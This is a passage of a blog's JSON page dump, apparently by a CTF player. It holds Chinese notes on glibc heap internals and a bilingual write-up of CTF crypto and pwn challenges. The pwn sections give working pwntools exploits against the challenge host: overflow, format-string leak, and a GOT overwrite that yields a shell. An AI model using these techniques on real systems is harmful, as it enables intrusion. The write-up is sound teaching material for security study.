
[{"content":"arena是用來管理heap的一種結構，在一般情況下一個thread只有一個arena\n而main thread的arena就叫做main arena\nDefination #\rstruct malloc_state { /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem; }; glibc是用malloc state這個結構來實現arena的功能的，其中有幾個重要的成員變數:\nmutex: 互斥鎖，防止多個thread同時讀寫同一個分配區\nflags: 記錄了一些分配區的標誌，具體如下\n/* FASTCHUNKS_BIT held in max_fast indicates that there are probably some fastbin chunks. It is set true on entering a chunk into any fastbin, and cleared only in malloc_consolidate. The truth value is inverted so that have_fastchunks will be true upon startup (since statics are zero-filled), simplifying initialization checks. */ #define FASTCHUNKS_BIT (1U) #define have_fastchunks(M) (((M)-\u0026gt;flags \u0026amp; FASTCHUNKS_BIT) == 0) #define clear_fastchunks(M) catomic_or(\u0026amp;(M)-\u0026gt;flags, FASTCHUNKS_BIT) #define set_fastchunks(M) catomic_and(\u0026amp;(M)-\u0026gt;flags, ~FASTCHUNKS_BIT) /* NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous regions. Otherwise, contiguity is exploited in merging together, when possible, results from consecutive MORECORE calls. The initial value comes from MORECORE_CONTIGUOUS, but is changed dynamically if mmap is ever used as an sbrk substitute. */ #define NONCONTIGUOUS_BIT (2U) #define contiguous(M) (((M)-\u0026gt;flags \u0026amp; NONCONTIGUOUS_BIT) == 0) #define noncontiguous(M) (((M)-\u0026gt;flags \u0026amp; NONCONTIGUOUS_BIT) != 0) #define set_noncontiguous(M) ((M)-\u0026gt;flags |= NONCONTIGUOUS_BIT) #define set_contiguous(M) ((M)-\u0026gt;flags \u0026amp;= ~NONCONTIGUOUS_BIT) /* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the arena. Such an arena is no longer used to allocate chunks. Chunks allocated in that arena before detecting corruption are not freed. */ #define ARENA_CORRUPTION_BIT (4U) #define arena_is_corrupt(A) (((A)-\u0026gt;flags \u0026amp; ARENA_CORRUPTION_BIT)) #define set_arena_corrupt(A) ((A)-\u0026gt;flags |= ARENA_CORRUPTION_BIT) FASTCHUNKS_BIT: 表示分配區是否有fastbin chunk 1:有 0:沒有 NONCONTIGUOUS_BIT: 是否回傳連續的分配區 0:連續 1:不連續 在主分配區系統會用sbrk()來擴展記憶體，所以分配趨是連續的 而在非主分配區系統會用mmap()來映射記憶體，所以非配區會不連續 ARENA_CORRUPTION_BIT: 記憶體是否損壞 當ARENA_CORRUPTION_BIT被設置(1)時，glibc會報錯並終止程式 fastbinsY: 各個fastbin的起始pointer\ntop: 指向top chunk\nlast_reminder: chunk被切割後的剩下的那塊\nbins: 包含unsortedbin、smallbin、largebin的起始點\nbinmaps: 在檢查bins，不可能一個一個去訪問，所以會把每個bin鍊的狀態用都一個bit來儲存，這樣用binary位移的方式訪問會比較快\nReferences #\rhttps://kiprey.github.io/2020/03/heap-1-arena/ https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-structure/#malloc_state ","date":"2025-02-04","externalUrl":null,"permalink":"/notes/pwn/heap/4-arena/","section":"Notes","summary":"arena是用來管理heap的一種結構，在一般情況下一個thread只有一個arena","title":"Arena","type":"notes"},{"content":" 名稱 chunk size 使用方式 查詢優先度 補充 資料結構 tcache 0x20 ~ 0x410 FILO(stack) 1 被 free 後，並不會 unset 下個 chunk 的 PREV_INUSE bit singly linked list fastbin 0x20 ~ 0x80 FILO(stack) 2 被 free 後，並不會 unset 下個 chunk 的 PREV_INUSE bit singly linked list smallbin 0x20 ~ 0x3f0 FIFO(queue) 3 doubly linked list largebin \u0026gt;= 0x400 FIFO(queue) 5 doubly linked list unsortedbin \u0026gt;= 0x90 FIFO(queue) 4 doubly linked list tcache #\r在 glibc \u0026gt; 2.26的版本才出現\n保存 #\rtypedef struct tcache_perthread_struct { char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS]; } tcache_perthread_struct; # define TCACHE_MAX_BINS 64 static __thread tcache_perthread_struct *tcache = NULL; 每個thread都會有一個tcache_perthread_struct，是維護tcache的管理結構\n第一次呼叫的時候會malloc一塊記憶體存放tcache_perthread_struct(大小為0x290) counts:用來記錄每個鏈上面的chunk數量 entries:chunk的起始點 運作 #\rtcache都會放入chunk直到被填滿(7塊)，被填滿後會把chunk放到對應大小的bins malloc時 如果在tcache範圍內，先從tcache裡面找 如果tcache為空，會從fastbin / smallbin / unsortedbin找size符合的 找到對應size的會先將fastbin / smallbin / unsortedbin放到tcache內部，直到填滿 free時 FILO: 會從鍊頭插入和取出chunk 不會進行heap consolidation，所以不unset PREV_INUSE bit fastbin #\r保存 #\rstruct malloc_chunk { INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize; }; ... typedef struct malloc_chunk* mchunkptr; struct malloc_state { ... /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; ... }; 運作 #\rfastbin各個chunk大小的pointer起始點會在被存在main_arena的fastbinsY陣列(main thread) 在64位元的系統中以chunk size以0x10遞增:由0x20到0x80 當對應大小的tcache滿出來的時候會被存到fastbin 一般情況下不會進行合併，所以不unset PREV_INUSE bit free時 FILO: 會從鍊頭插入和取出chunk smallbin #\r用來存放中大小的bin，會由unsortedbin轉移\n保存 #\rstruct malloc_state { ... mchunkptr bins[NBINS * 2 - 2]; ... }; bins 陣列負責管理unsortedbin/smallbin/largebin鍊的起始點 大小為126 1:unsortedbin 263:smallbin 64126:largebin 運作 #\r進入方式 由unsortedbin放入 free時 FIFO: 會從鍊頭插入chunk，從鍊尾取出chunk(因為是雙向陣列，可以透過bk找到鍊尾) 會進行合併: 若前方或後方的chunk為freed chunk，而合併後的chunk會被插入到unsortedbin largebin #\r保存 #\rsmallbin那邊有講，不過size不像是fastbin、smallbin是以0x10遞增的\n63條bin鍊總共分為六組，每組有相同的遞增值\nex: 第一組由0x40做遞增，第1條bin鍊:0x4000x430, 第2條bin鍊:0x4400x470\n數量 遞增值 32 0x40 16 0x200 8 0x1000 4 0x8000 2 0x4000 1 無限制 運作 #\rfd_nextsize \u0026amp; bk_nextsize 在同個bin鍊會出現不同的大小，彼此用fd_nextsize/bk_nextsize連接(size會依大小降序排列) 進入方式 由unsortedbin放入 free時 FIFO: 會從鍊頭插入chunk中的對應size，從鍊尾取出chunk 會進行合併 unsortedbin #\r如其名，unsortedbin會串聯一堆大小不同的chunk\n保存 #\rsmallbin那邊有講\n運作 #\r以下情況會進入unsortedbin fastbin size \u0026lt; chunk size \u0026lt;= tcache size, tcache該size已滿 要被合併/分割過後的chunk free時 FIFO: 會從鍊頭插入chunk，從鍊尾取出chunk malloc時 在查過 tcache, smallbin之後會去查unsortedbin是否有fit size的chunk 若有則會把該chunk取出 若無 會把分割一塊\u0026gt;該chunk size的chunk(如果有) 並把對應大小的chunk送到smallbin/largebin References #\rsource code 南瓜的簡報 https://saku376.github.io/2021/06/16/堆溢出利用之fastbin/ https://www.eet-china.com/mp/a254008.html https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/implementation/tcache/ https://blog.csdn.net/qq_41453285/article/details/96865321 https://medium.com/@soh0ro0t/diving-deep-into-heap-glibc-fastbin-consolidation-4c1f38a70917 https://tyeyeah.github.io/2021/05/12/2021-05-12-Heap-Exploit-Intro/ ","date":"2025-01-30","externalUrl":null,"permalink":"/notes/pwn/heap/3-bin/","section":"Notes","summary":"名稱 chunk size 使用方式 查詢優先度 補充 資料結構 tcache 0x20 ~ 0x410 FILO(stack) 1 被 free 後，並不會 unset 下個 chunk 的 PREV_INUSE bit singly linked list fastbin 0x20 ~ 0x80 FILO(stack) 2 被 free 後，並不會 unset 下個 chunk 的 PREV_INUSE bit singly linked list smallbin 0x20 ~ 0x3f0 FIFO(queue) 3 doubly linked list largebin \u0026gt;= 0x400 FIFO(queue) 5 doubly linked list unsortedbin \u0026gt;= 0x90 FIFO(queue) 4 doubly linked list tcache #\r在 glibc \u0026gt; 2.","title":"Bin","type":"notes"},{"content":"\rdefination #\rchunk的定義如下\nstruct malloc_chunk { INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize; }; 是malloc分配的基本記憶體單位，其size必為0x10的倍數 最小的chunk size是0x20 allocated Chunk #\rallocated chunk代表使用中的chunk\nfree chunk #\r被free之後的chunk會被放到對應順序、大小的bin中\nmetadata #\rchunk的前0x10個byte會是metadata，所以使用者請求的大小會比實際的chunk大小0x10\nprev size/data #\rprev size: 如果上一個chunk是freed chunk prev data: 如果上一個chunk是allocated chunk 這樣能使空間達到最大的利用\n而prevsize可以快速地找到上一個chunk的起始位置\nA,M,P #\r因為chunk size會是0x10的倍數，所以會多出來幾個bit可以用來當別的功能使用\nmalloc回傳起始點\n","date":"2025-01-28","externalUrl":null,"permalink":"/notes/pwn/heap/2-chunk/","section":"Notes","summary":"defination #\rchunk的定義如下","title":"Chunk","type":"notes"},{"content":"\rbasic #\rheap 用來存動態記憶體(透過手動分配大小的記憶體) 會使用跟stack不同的區段 大小分配 #\r在請求大小\u0026gt;=0x20000byte的時候會呼叫mmap去跟glibc要一塊新的記憶體 在請求大小\u0026lt;0x20000的時候會呼叫brk去擴展當前記憶體 名詞解釋 #\rarena #\rarena用於紀錄heap的狀態\n正常情況下，每個thread會有一個arena\n而main thread使用的arena就叫做main arena\nchunk #\rheap進行記憶體分配的基本結構\n在每次malloc的時候會切分一塊chunk給用戶使用\nbin #\rfree的時候會把chunk丟進bins\n目前有五個機制不同的bins\ntcache fastbin unsortedbin smallbin largebin ","date":"2025-01-28","externalUrl":null,"permalink":"/notes/pwn/heap/1-heap/","section":"Notes","summary":"basic #\rheap 用來存動態記憶體(透過手動分配大小的記憶體) 會使用跟stack不同的區段 大小分配 #\r在請求大小\u0026gt;=0x20000byte的時候會呼叫mmap去跟glibc要一塊新的記憶體 在請求大小\u0026lt;0x20000的時候會呼叫brk去擴展當前記憶體 名詞解釋 #\rarena #\rarena用於紀錄heap的狀態","title":"Heap","type":"notes"},{"content":"","date":"2025-04-21","externalUrl":null,"permalink":"/","section":"Homepage","summary":"","title":"Homepage","type":"page"},{"content":"","date":"2025-04-21","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"\rCrypto #\rSNAKE #\r把拆開來看大概經過了下面的步驟\nThe process can roughly be broken down into the following steps:\n轉成二進位的字串\nConvert to a binary string 遍歷nibble(四個bit稱nibble)\nIterate over the nibble (a nibble consists of four bits) 把nibble轉成數字\nConvert the nibble to a number 用這個數字當index去存取一個字母表\nUse this number as an index to access a character set 這就是一個hex encode，把剛剛那個字母表取代為hex用到的字母表就好了\nThis is a hex encoding, just replace the previous character set with the one used in hex encoding.\na = \u0026#34;!@#$%^\u0026amp;*(){}[]:;\u0026#34; b = \u0026#34;0123456789abcdef\u0026#34; C = open(\u0026#39;output.txt\u0026#39;).read() for i in range(16): C = C.replace(a[i], b[i]) print(bytes.fromhex(C)) Twins #\r這題是孿生質數(twin prime)相乘\n$ N = p \\cdot (p + 2) $\n因為:\n$ (p + 1)^2 = p^2 + 2p + 1 $\n所以:\n$ p^2 \u0026lt; N \u0026lt; (p + 1)^2$\n$ p \u0026lt; \\sqrt{N} \u0026lt; p+1$\n由以上推導(其實也可以不用知道)，$\\sqrt{N}$會非常接近$p$\n有$p$就可以分解$N$了\nThis problem is about the multiplication of twin primes.\n$ N = p \\cdot (p + 2) $\nBecause:\n$ (p + 1)^2 = p^2 + 2p + 1 $\nTherefore:\n$ p^2 \u0026lt; N \u0026lt; (p + 1)^2$\n$ p \u0026lt; \\sqrt{N} \u0026lt; p+1$\nFrom the above, we can deduce (though not necessarily need to know this), that $\\sqrt{N}$ is very close to $p$.\nOnce we have $p$, we can factor $N$.\nfrom Crypto.Util.number import * import gmpy2 N = 28265512785148668054687043164424479693022518403222612488086445701689124273153696780242227509530772578907204832839238806308349909883785833919803783017981782039457779890719524768882538916689390586069021017913449495843389734501636869534811161705302909526091341688003633952946690251723141803504236229676764434381120627728396492933432532477394686210236237307487092128430901017076078672141054391434391221235250617521040574175917928908260464932759768756492640542972712185979573153310617473732689834823878693765091574573705645787115368785993218863613417526550074647279387964173517578542035975778346299436470983976879797185599 e = 65537 C = 1234497647123308288391904075072934244007064896189041550178095227267495162612272877152882163571742252626259268589864910102423177510178752163223221459996160714504197888681222151502228992956903455786043319950053003932870663183361471018529120546317847198631213528937107950028181726193828290348098644533807726842037434372156999629613421312700151522193494400679327751356663646285177221717760901491000675090133898733612124353359435310509848314232331322850131928967606142771511767840453196223470254391920898879115092727661362178200356905669261193273062761808763579835188897788790062331610502780912517243068724827958000057923 p = gmpy2.isqrt(N) q = p + 2 assert p * q == N phi = (p - 1) * (q - 1) d = pow(e, -1, phi) m = pow(C, d, N) print(long_to_bytes(m)) speeded block cipher #\r標題詐騙，其實是stream cipher\nThe title is misleading; it’s actually a stream cipher.\nAnalysis of the Encryption #\rdef main(): encrypted_flag = encrypt(pad(FLAG)).hex() print(f\u0026#34;Here is your encrypted flag: {encrypted_flag}\u0026#34;) while True: plaintext = input(\u0026#34;encrypt(hex) \u0026gt; \u0026#34;) plaintext = bytes.fromhex(plaintext) ciphertext = encrypt(pad(plaintext)).hex() print(f\u0026#34;ciphertext: {ciphertext}) 把pad過後的FLAG先丟進去加密\n接下來有無數次加密\nFirst, pad the FLAG and then encrypt it.\nAfter that, there are countless encryptions.\ndef encrypt(plaintext: bytes) -\u0026gt; bytes: PS = len(plaintext) // 16 P = [plaintext[i: i + 16] for i in range(0, PS * 16, 16)] K = expand_key([IV, KEY], PS) C = [] for i, B in enumerate(P): C.append(add(B, K[i])) return b\u0026#34;\u0026#34;.join(C) 看一下encrypt()\nplaintext切塊成P(16 byte) PS是塊的數量 生成K 把每個add(P[i], K[i])合併成密文 Look at the encrypt() function:\nSplit the plaintext into P (16 bytes). PS is the number of blocks. Generate K. Combine each add(P[i], K[i]) to form the ciphertext. def shift_rows(B: list): M = [B[i: i + 4] for i in range(0, 16, 4)] M[0][1], M[1][1], M[2][1], M[3][1] = M[1][1], M[2][1], M[3][1], M[0][1] M[0][2], M[1][2], M[2][2], M[3][2] = M[2][2], M[3][2], M[0][2], M[1][2] M[0][3], M[1][3], M[2][3], M[3][3] = M[3][3], M[0][3], M[1][3], M[2][3] return bytes(M[0] + M[1] + M[2] + M[3]) def expand_key(K, PS): for i in range(PS - 1): NK = [(~(x + y)) \u0026amp; 0xFF for x, y in zip(K[i], K[i + 1])] NK = [(x \u0026gt;\u0026gt; 4) | (x \u0026lt;\u0026lt; 4) \u0026amp; 0xFF for x in NK] NK = shift_rows(NK) K.append(NK) return K[1:] K是這個cipher的keystream\nK is the keystream of this cipher.\ndef add(a: bytes, b: bytes) -\u0026gt; bytes: return bytes([((x + 1) ^ y) \u0026amp; 0xff for x, y in zip(a, b)]) sol #\r分析add()\n把a每個byte+1再xorb 可以發現每次加密的keystream都會一樣，是因為的key和nonce(我這邊取名叫IV)重複使用\n所以生成的keystream會是一樣的\n剛剛分析過add，我們可以透過傳送\\xff * n來獲得長度n的keystream\nAnalysis of the add() Function\nIncrement each byte of a by 1, and xor it with b It can be observed that the keystream generated during each encryption is always the same because the key and nonce (which I call IV here) are reused.\nThus, the generated keystream will be the same.\nHaving analyzed the add function earlier, we can obtain a keystream of length n by sending \\xff * n.\nfrom pwn import * r = remote(\u0026#34;chal.ctf.scint.org\u0026#34;, 12001) r.recvuntil(b\u0026#34;Here is your encrypted flag: \u0026#34;) ciphertext = r.recvline().strip().decode() print(ciphertext) r.sendlineafter(b\u0026#39;encrypt(hex) \u0026gt; \u0026#39;, b\u0026#39;F\u0026#39; * len(ciphertext)) r.recvuntil(b\u0026#39;ciphertext: \u0026#39;) key = r.recvline().strip().decode() key = bytes.fromhex(key) ciphertext = bytes.fromhex(ciphertext) plain_1 = xor(key, ciphertext) print(bytes([(x - 1) % 256 for x in plain_1])) Yoshino\u0026rsquo;s Secret #\r我們想把b'{\u0026quot;admin\u0026quot;:false,\u0026quot;id\u0026quot;:\u0026quot;TomotakeYoshino\u0026quot;}'改成b'{\u0026quot;admin\u0026quot;:true,\u0026quot;id\u0026quot;:\u0026quot;TomotakeYoshino\u0026quot;}'\nAES CBC模式+已知IV+可控IV，我們可以透過bit flipping在不破壞明文結構的情況下竄改部分內容\npayload:\n$P_i$是第$i$個明文塊\n$C_i$是第$i$個密文塊\n$P_{ifake}$是我們希望竄改的第$i$個明文塊\n$IV \\oplus P_1 \\oplus P_{1fake}||C_1||C_2||\u0026hellip;||C_n$\nWe want to change b'{\u0026quot;admin\u0026quot;:false,\u0026quot;id\u0026quot;:\u0026quot;TomotakeYoshino\u0026quot;}' to b'{\u0026quot;admin\u0026quot;:true,\u0026quot;id\u0026quot;:\u0026quot;TomotakeYoshino\u0026quot;}'.\nIn AES CBC mode with a known IV and controllable IV, we can use bit flipping to modify part of the content without breaking the plaintext structure.\nPayload: $P_i$ is the $i$-th plaintext block\n$C_i$ is the $i$-th ciphertext block\n$P_{ifake}$ is the $i$-th modified plaintext block we want\n$IV \\oplus P_1 \\oplus P_{1fake} || C_1 || C_2 || \u0026hellip; || C_n$\nfrom pwn import * io = remote(\u0026#34;chal.ctf.scint.org\u0026#34;, 12002) io.recvuntil(\u0026#34;token: \u0026#34;) token = bytes.fromhex(io.recvline().strip().decode()) iv = token[:16] cipher = token[16:] iv = xor(b\u0026#34;{\\\u0026#34;admin\\\u0026#34;:false,\\\u0026#34;\u0026#34;, iv, b\u0026#34;{\\\u0026#34;admin\\\u0026#34;:true ,\\\u0026#34;\u0026#34;) print(len(iv)) io.sendline((iv + cipher).hex().encode()) io.interactive() Proactive Planning #\r問題:\n$$$$$$ \\left{ \\begin{aligned} C_1 \\equiv m^e \\pmod{p} \\ C_2 \\equiv m^e \\pmod{q} \\end{aligned} \\right. $$$$$$\n可以透過中國餘數定理來獲得:\n$x \\equiv m^e \\pmod{pq}$\n因為$m^e \u0026lt; N$\n所以可以開根號獲得$m$\n$N$是平滑數，可以用Pollard's p − 1 algorithm分解\nProblem: $$$$$$ \\left{ \\begin{aligned} C_1 \u0026amp;\\equiv m^e \\pmod{p} \\ C_2 \u0026amp;\\equiv m^e \\pmod{q} \\end{aligned} \\right. $$$$$$ We can use the Chinese Remainder Theorem to obtain: $x \\equiv m^e \\pmod{pq}$ Since $m^e \u0026lt; N$, we can take the square root to find $m$.\n$N$ is a smooth number, and we can use Pollard's p − 1 algorithm to factor it.\nfrom functools import reduce from Crypto.Util.number import * import gmpy2 N = 245420687480030910293131014681513097316897805860015907997290238793037908061889321970643067747599071632004876697443892740373461832739897404992824039705666859978685676148256731481249619240551600688298823327813334982026265819211162436599172552911207622820925395779431967038741077978296032479504244355879076453277839429545428814902805521915851958370011985365075951876093117572939169114186231535255600467275910045372664823195201131313527121300982333739031725446282902152339315042184197622728983863008210927860642758785909138094209306401823250950926284525837770539470052437688590958247465743249015240761650092149407846622211263071037972525183724098938285521476262814934333028607057009674482959012439713961806522389998648832738221606988997592254025463923056643491555337751576246212477882961978575063306242120071365998703341290638505057206765318294021015227372445846979566876416540849080721228851969658123571699007157401963955407592209580070811271329855359365939200000000000000000000000000000000000000000000000000000000000001 e = 16 C = (439231781791682053787800004789500090515405069827267575310144126412212073183656886443512317513437473988568312910849382831051282684866166595013378449246972680452849180695018251047606404399499477181963259998873867440078915470666285294221911483418402164843781527921484550804953154534529236021532462370697370102805338053891442902369171104271440920515546754256339545640481851380162960169019944927911544549873309962781026864701346082115190565271316812955086674541362687313443721995481784918571627855813953908700661871, 45410653305386550806460293366683163840683840887693958374757667150684575232478721464002571675632111383800324454952726849708032360360624723016258879665846393001487751401561000041560174839749619393896575704973412066318065208130082079245493618249592605498133955508921363368248057347635043808420720293553618262120872986948419118763039316625791521751697579251125903615079781604221702413469589144193751155342922907250225850266858411329191983637433918466243662523860234353921039582601873103221279579701559507155136) def crt(N: tuple, C: tuple): sum = 0 prod = reduce(lambda a, b: a * b, N) for n, c in zip(N, C): r = prod // n sum += c * pow(r, -1, n) * r return int(sum % prod) # https://github.com/killua4564/Crypto-pyfile/blob/main/factorization.py def pollard(n: int) -\u0026gt; int: a, b = 2, 2 while True: a = pow(a, b, n) p = GCD(a - 1, n) if 1 \u0026lt; p \u0026lt; n: return p b += 1 p = pollard(N) q = N // p m_16 = crt(N=(p,q), C=C) print(long_to_bytes(gmpy2.iroot(m_16,e)[0] )) m_16 = crt(N=(q,p), C=C) print(long_to_bytes(gmpy2.iroot(m_16,e)[0] )) Pwn #\rMoney overflow #\r解法寫在標題上，我人太好了吧\nstruct { int id; char name[20]; unsigned short money; } customer; 弱點在\nThe vulnerability:\ngets(customer.name); 不會限制輸入大小\nThere is no input size limitation.\nfrom pwn import * r = remote(\u0026#39;chal.ctf.scint.org\u0026#39;, 10001) r.sendlineafter(b\u0026#39;Enter your name: \u0026#39;, b\u0026#39;a\u0026#39;*20 + pack(65535, 16)) r.sendlineafter(b\u0026#39;Buy \u0026gt; \u0026#39;, b\u0026#39;5\u0026#39;) r.interactive() Insecure Shell #\rif (check_password(password, buf, strlen(buf))) printf(\u0026#34;Wrong password!\\n\u0026#34;); else system(\u0026#34;/bin/sh\u0026#34;); int check_password(char *a, char *b, int length) { for (int i = 0; i \u0026lt; length; i++) if (a[i] != b[i]) return 1; return 0; } check_password會以字串長度當作判斷依據\n弱點:strlen會把\\x00判定為字串結尾\n所以送出\\x00就可以getshell了\nThe check_password function uses the string length as the criteria for judgment.\nVulnerability: strlen treats \\x00 as the end of the string.\nTherefore, sending \\x00 can lead to getting shell access.\nfrom pwn import * r = remote(\u0026#34;chal.ctf.scint.org\u0026#34;, 10004) r.sendline(b\u0026#34;\\x00\u0026#34;) r.interactive() Once #\r字串secret被存在stack上，我們要想辦法leak出他\nThe string secret is stored on the stack. We need to figure out a way to leak it out.\nwhile (1) { printf(\u0026#34;guess \u0026gt;\u0026#34;); scanf(\u0026#34;%15s\u0026#34;, buf); getchar(); printf(\u0026#34;Your guess: \u0026#34;); printf(buf); printf(\u0026#34;\\n\u0026#34;); printf(\u0026#34;Are you sure? [y/n] \u0026gt;\u0026#34;); scanf(\u0026#34;%1c\u0026#34;, \u0026amp;is_sure); getchar(); if (is_sure == \u0026#39;y\u0026#39;) { if (!strcmp(buf, secret)) { printf(\u0026#34;Correct answer!\\n\u0026#34;); system(\u0026#34;/bin/sh\u0026#34;); } else { printf(\u0026#34;Incorrect answer\\n\u0026#34;); printf(\u0026#34;Correct answer is %s\\n\u0026#34;, secret); break; } } } 這邊有一個無限loop可以讓我們確認輸入的資訊，但問題就出在這上面\nThere is an infinite loop here that allows us to confirm the input information, but the issue lies in this part.\nprintf(\u0026#34;Your guess: \u0026#34;); printf(buf); 這邊就給了一個format string bug\n我們可以透過%?$p來以指標形式(8 bytes的十六進位)印出第?個參數\n根據linux x64 calling convention\nstack的值會從6開始\nHere, we have a format string bug.\nWe can use %?$p to print the ?-th parameter as a pointer (8 bytes in hexadecimal).\nAccording to the Linux x64 calling convention, the values on the stack start from index 6.\n我們要取secret位於rsp + 0x10、rsp + 0x18 所以可以用%8$p和%9$p來得到secret\nWe want to get secret located at rsp + 0x10 and rsp + 0x18.\nSo, we can use %8$p and %9$p to retrieve secret.\nfrom pwn import * r = remote(\u0026#34;chal.ctf.scint.org\u0026#34;, 10002) secret = b\u0026#34;\u0026#34; r.sendlineafter(b\u0026#34;guess \u0026gt;\u0026#34;, b\u0026#34;%8$p\u0026#34;) r.recvuntil(b\u0026#34;Your guess: \u0026#34;) rec = r.recvline().strip() secret += pack(int(rec, 16), 64) r.sendlineafter(b\u0026#34;Are you sure? [y/n] \u0026gt;\u0026#34;, b\u0026#34;n\u0026#34;) r.sendlineafter(b\u0026#34;guess \u0026gt;\u0026#34;, b\u0026#34;%9$p\u0026#34;) r.recvuntil(b\u0026#34;Your guess: \u0026#34;) rec = r.recvline().strip() secret += pack(int(rec, 16), 64) r.sendlineafter(b\u0026#34;Are you sure? [y/n] \u0026gt;\u0026#34;, b\u0026#34;n\u0026#34;) print(f\u0026#34;secret: {secret}\u0026#34;) r.sendlineafter(b\u0026#34;guess \u0026gt;\u0026#34;, secret[:15]) r.sendlineafter(b\u0026#34;Are you sure? [y/n] \u0026gt;\u0026#34;, b\u0026#34;y\u0026#34;) r.interactive() bank clerk #\rIt got unintended:(\nint accounts[100]; accounts位於全域變數\naccounts is located in global variables.\nscanf(\u0026#34;%d\u0026#34;, \u0026amp;id); if (choice == 1) deposit(id); else if (choice == 2) withdraw(id); void deposit(int id) { unsigned int amount; printf(\u0026#34;Enter the amount to deposit\u0026gt; \u0026#34;); scanf(\u0026#34;%u\u0026#34;, \u0026amp;amount); accounts[id] += amount; printf(\u0026#34;Deposited %u$ to account %d\\n\u0026#34;, amount, id); } void withdraw(int id) { unsigned int amount; printf(\u0026#34;Enter the amount to withdraw\u0026gt; \u0026#34;); scanf(\u0026#34;%u\u0026#34;, \u0026amp;amount); if (amount \u0026gt; accounts[id]) { printf(\u0026#34;ERROR! Current balance: %u\\n\u0026#34;, accounts[id]); sleep(1); } else { accounts[id] -= amount; printf(\u0026#34;Withdrew %u$ from account %d\\n\u0026#34;, amount, id); } } 發現有 oob read/write\nDiscovered out-of-bounds read/write\n找offset #\rvoid withdraw(int id) { ... if (amount \u0026gt; accounts[id]) { printf(\u0026#34;ERROR! Current balance: %u\\n\u0026#34;, accounts[id]); sleep(1); } ... } 這段允許我們oob read，只要給的值夠大\nThis part allows us to perform out-of-bounds read, as long as the given value is large enough\n接下來我們要嘗試leak出backdoor()的address，可以看附近有什麼東西可以用\n我這邊選data段+0x58\nNext, we want to try leaking the address of backdoor(), and check if there\u0026rsquo;s anything nearby we can use\nHere, I chose data segment + 0x58\n改got #\rgot jump slot是rw\n我們可以嘗試竄改jump slot來跳到backdoor()\nThe GOT jump slot is rw,\nso we can try to overwrite the jump slot to redirect execution to backdoor().\nvoid deposit(int id) { ... scanf(\u0026#34;%u\u0026#34;, \u0026amp;amount); accounts[id] += amount; ... } 這個函數允許我們把account[id]改成任意值 我們需要修改兩次才能把選定的jump slot改到我們想要的地址\n所以選擇我選擇改sleep\nThis function allows us to modify account[id] to any value.\nWe need to modify it twice to fully overwrite the chosen jump slot to our desired address.\nSo, I chose to overwrite sleep.\nfrom pwn import * r = remote(\u0026#39;chal.ctf.scint.org\u0026#39;, 10003) def add(addr, value): r.sendlineafter(b\u0026#34;Your choice\u0026gt; \u0026#34;, b\u0026#34;1\u0026#34;) r.sendlineafter(b\u0026#34;id\u0026gt; \u0026#34;, str(addr).encode()) r.sendlineafter(b\u0026#34;Enter the amount to deposit\u0026gt; \u0026#34;, str(value).encode()) def leak(addr): r.sendlineafter(b\u0026#34;Your choice\u0026gt; \u0026#34;, b\u0026#34;2\u0026#34;) r.sendlineafter(b\u0026#34;id\u0026gt; \u0026#34;, str(addr).encode()) r.sendlineafter(b\u0026#34;Enter the amount to withdraw\u0026gt; \u0026#34;, str(0xffffffff).encode()) return int(r.recvline().strip().split(b\u0026#34;: \u0026#34;)[-1]) dso_handle_addr_h = leak(-9) dso_handle_addr_l = leak(-10) dso_handle_addr = (dso_handle_addr_h \u0026lt;\u0026lt; 0x20) | dso_handle_addr_l backdoor_addr = dso_handle_addr - 0x4058 + 0x1250 print(f\u0026#34;backdoor_addr: {hex(backdoor_addr)}\u0026#34;) backdoor_addr_h = backdoor_addr \u0026gt;\u0026gt; 0x20 backdoor_addr_l = backdoor_addr \u0026amp; 0xffffffff sleep_addr_h = leak(-13) sleep_addr_l = leak(-14) diff_h = (backdoor_addr_h - sleep_addr_h) \u0026amp; 0xffffffff diff_l = (backdoor_addr_l - sleep_addr_l) \u0026amp; 0xffffffff sleep_addr = (sleep_addr_h \u0026lt;\u0026lt; 0x20) | sleep_addr_l print(f\u0026#34;sleep_addr: {hex(sleep_addr)}\u0026#34;) add(-14, diff_l) add(-13, diff_h) leak(0) r.interactive() unintend solve #\r在第一次呼叫前jump slot裡面的address就都已經是binary的pie base了\n只要算offset加上去就好了\nBefore the first call, the addresses in the jump slots are already filled with the binary\u0026rsquo;s PIE base.\nSo we just need to calculate the offset and add it to the base.\nPainter #\r我這題打造了一個類似stack的操作來存放資料，但沒限制可使用的範圍\nI built a stack-like structure to store data in this challenge,\nbut there is no restriction on the accessible range.\n我們可以透過new 到超過 collection[] 大小來做oob read/write(對，又是oob) 在stack上面read/write可以很直覺的聯想到蓋一個rop + 